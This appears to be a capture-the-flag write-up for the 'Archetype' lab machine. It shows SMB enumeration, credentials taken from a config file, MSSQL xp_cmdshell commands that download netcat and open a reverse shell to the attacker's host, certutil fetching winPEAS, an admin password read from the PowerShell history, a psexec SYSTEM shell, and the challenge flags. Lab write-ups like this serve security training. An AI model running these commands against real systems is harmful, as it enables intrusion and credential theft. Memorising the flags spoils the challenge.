# Archetype

---

IP = `10.129.250.121`

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

```
# smbclient -NL 10.129.250.121

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.250.121 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
smb: \> ls
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

                5056511 blocks of size 4096. 2611351 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

```
from prod.dtsConfig, we found credentials

`Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`

```
┌──(root㉿core)-[/work/ctf/htb/archetype]
└─# impacket-mssqlclient sql_svc@10.129.250.121 -windows-auth
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>

```

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.4.96.175/nc64.exe -outfile nc64.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.142 443"

certutil.exe -urlcache -f http://10.10.14.142/winPEAS.ps1 winPEAS.ps1

certutil.exe -f http://10.4.96.175/winPEAS.ps1 winPEAS.ps1

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Privesc 1 :
`SeImpersonatePrivilege        Impersonate a client after authentication Enabled`
is vulnerable to juicy-potato-exploit

Privesc 2:
```
=========||  Password Check in Files/Folders
=========|| Password Check. Starting at root of each drive. This will take some time. Like, grab a coffee or tea kinda time.
=========|| Looking through each drive, searching for *.xml *.txt *.conf *.config *.cfg *.ini .y*ml *.log *.bak *.xls *.xlsx *.xlsm
--SNIP--
Possible Password found: Usernames2
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Usernames2 triggered
> net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
  exit
--SNIP--
```
We got in cleartext the password for the `Administrator` user which is `MEGACORP_4dm1n!!`
We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator:
`impacket-psexec.py administrator@{TARGET_IP}`


From the output (winpeas) we can observe that we have `SeImpersonatePrivilege` (more information can be found
[here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege)), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato). However, we can first check the two existing files
where credentials could be possible to be found.

As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of `.bash_history` for Linux systems. The file `ConsoleHost_history.txt` can be located in the directory
`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\` .


```
┌──(root㉿core)-[/work/ctf/htb/archetype]
└─# impacket-psexec administrator@10.129.250.121
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.250.121.....
[*] Found writable share ADMIN$
[*] Uploading file OBDQzcTc.exe
[*] Opening SVCManager on 10.129.250.121.....
[*] Creating service BxwR on 10.129.250.121.....
[*] Starting service BxwR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

**user.txt**

`3e7b102e78218e935bf3f4951fec21a3`

**root.txt**

`b91ccec3305e98240082d4474b848528`